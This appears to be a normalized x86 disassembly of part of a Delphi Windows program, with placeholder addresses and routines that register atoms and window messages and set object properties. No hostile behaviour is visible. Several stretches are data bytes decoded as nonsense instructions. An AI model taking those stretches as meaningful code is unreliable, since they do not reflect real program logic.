call sub_40326c
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_40326c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fbc
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fbc
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_449514
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44968c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408b94
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404010
mov eax [ rw-data ]
call sub_40447c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b94
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404010
mov eax [ rw-data ]
call sub_40447c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40447c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413bdc
mov [ rw-data ] eax
call sub_449118
mov dl 0x1
mov eax [ r-xdata ]
call sub_448f40
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c1ec
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d2d0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45eeb8
mov ecx r-xdata
mov edx sub_43af80
mov eax [ r-xdata ]
call sub_413390
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449693
lea eax [ ebp - 0x10 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4496fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44975b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449762
retn
mov eax rw-data
call sub_40cd80
call sub_44948c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
sub_449764
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4497ea
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4497f1
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_449514
mov eax [ r-xdata ]
call sub_413204
mov eax [ r-xdata ]
call sub_4132a4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
sub_449c1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
pushfd
inc esp
add [ eax ] dh
add [ eax ] al
add [ edx + ebx + 0x41 ] bh
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
int3
sub_449dfa
out dx eax
inc esp
stosd [ edi ]
inc esp
add ah ch
stosd [ edi ]
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add [ edx + esi ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
sbb [ esi + 0xd070044 ] bl
push esp
inc ebx
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419ccc
test bl bl
jle r-xdata
mov edx esi
call sub_44a320
inc ecx
add [ esp + ebx * 4 + 0x41 ] al
add [ esp + ebx * 4 + 0x41 ] dh
add [ ebx + ebx * 4 - 0x63d7ffbf ] dl
inc ecx
add [ esp + ebx * 4 + 0x41 ] bh
add [ eax ] dl
movsd [ edi ] [ esi ]
inc esp
add [ 0xffffffffa5380044 ] ah
inc esp
add [ ebp + 0x44 ] cl
add [ eax - 0x5b ] ah
inc esp
add [ ebp + 0x44 ] dh
add [ eax - 0x63ffbb5b ] cl
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x3bffbb5b ] dh
movsd [ edi ] [ esi ]
inc esp
add al bl
movsd [ edi ] [ esi ]
inc esp
add ah bl
movsd [ edi ] [ esi ]
inc esp
add al ah
movsd [ edi ] [ esi ]
inc esp
add ah ah
movsd [ edi ] [ esi ]
inc esp
add al ch
movsd [ edi ] [ esi ]
inc esp
add ah ch
movsd [ edi ] [ esi ]
inc esp
add al dh
movsd [ edi ] [ esi ]
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add al bh
movsd [ edi ] [ esi ]
inc esp
add ah bh
movsd [ edi ] [ esi ]
inc esp
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc esp
add [ esi ] al
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xe5e85653
xchg esi eax
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
pushfd
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
add [ eax - 0x64 ] dh
inc eax
add [ eax ] ah
xor al [ eax ]
fcomp [ ebx - 0x6427ffbf ]
inc ecx
add [ eax ] dl
pushfd
inc ecx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ ebp - 0x6737ffbc ] 0x44
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x9e880000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lahf
inc esp
add [ eax ] bl
add [ eax ] al
add ah dh
and eax [ ecx ]
mov ah 0x34
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
sub_449f0c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419ccc
test bl bl
jle r-xdata
mov edx esi
call sub_44a320
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_449f7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4197e0
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44a024
sub_449fb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449f40
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4138b8
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413a44
sub_449ff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4043c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_404010
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44a024
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44a320
mov edx ebx
mov eax esi
call sub_44a300
sub_44a04c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44a024
sub_44a078
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45fc34
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403468
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419d58
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43adac
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a0d0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45fc5c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403468
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419d74
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43adac
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a128
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419380
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44a2ac
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44a194
push ebx
push esi
push edi
call sub_4035f8
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_40326c
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413ab0
call sub_40326c
mov eax [ edi + 0x30 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4193cc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035e0
sub_44a1e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44a22c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413a24
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov edx edi
call sub_449fb0
sub_44a278
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44bfd4
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44c018
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419450
sub_44a2b8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41969c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44a320
sub_44a300
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41386c
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419450
pop esi
pop ebx
retn
sub_44a320
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413b0c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44a33c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44a3a4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_455a14
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44d870
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44ac4c
mov edx ebp
call sub_44acac
inc eax
je r-xdata
sub_44a430
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44a450
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44a470
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44a8c0
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44a8c0
sub_44a608
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419c88
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44a65c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_40326c
mov eax [ esi + 0x9c ]
call sub_40326c
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_449f0c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cd80
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_44a6ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414068
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44a758
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44a7b8
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44a8c0
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44a9f8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44aa58
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44aab4
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44ab18
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a758
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4043c8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_404010
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
sub_44a7b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44a8b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44a270
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44a25c
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44a7b8
sub_44a8c0
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
sub_44a938
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4043c8
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_404010
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139c8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139c8
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
sub_44a9a0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
sub_44a9f8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4043c8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_404010
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
sub_44aa58
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
sub_44aab4
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
sub_44ab18
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4139c8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_40341c
test eax eax
je r-xdata
sub_44ab78
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4043c8
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_4198d8
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44a758
sub_44abc4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44abec
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
